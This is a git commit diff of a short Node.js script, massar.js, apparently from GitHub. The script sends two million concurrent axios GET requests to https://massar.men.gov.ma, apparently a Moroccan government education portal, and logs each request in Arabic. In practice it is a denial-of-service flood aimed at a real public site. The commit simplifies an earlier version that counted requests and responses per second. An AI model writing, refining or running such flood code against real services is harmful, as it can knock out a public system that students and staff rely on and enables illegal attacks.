0cc3ab36783c36ea43f8288409bbd12dee01688f
karimAlyamani <105087359+Kbot19@users.noreply.github.com>
2024-04-06 13:38:01 +0000

    Update massar.js

--- massar.js
+++ massar.js
@@ -1,27 +1,18 @@
 const axios = require('axios');
 
-async function run() {
+function sendRequests() {
   const url = 'https://massar.men.gov.ma';
   const concurrency = 2000000;
-  let requestsCount = 0;
-  let responsesCount = 0;
 
-  const requests = [];
   for (let i = 0; i < concurrency; i++) {
-    requests.push(axios.get(url));
-  }
-
-  setInterval(() => {
-    console.log(`تم إرسال ${requestsCount} طلب وتم استلام ${responsesCount} استجابة في الثانية الحالية.`);
-    requestsCount = 0;
-    responsesCount = 0;
-  }, 1000);
-
-  for (const request of requests) {
-    await request;
-    requestsCount++;
-    responsesCount++;
+    axios.get(url)
+      .then(() => {
+        console.log(`تم إرسال الطلب رقم ${i + 1}`);
+      })
+      .catch((error) => {
+        console.error(`حدث خطأ أثناء إرسال الطلب رقم ${i + 1}: ${error}`);
+      });
   }
 }
 
-run();
+sendRequests();
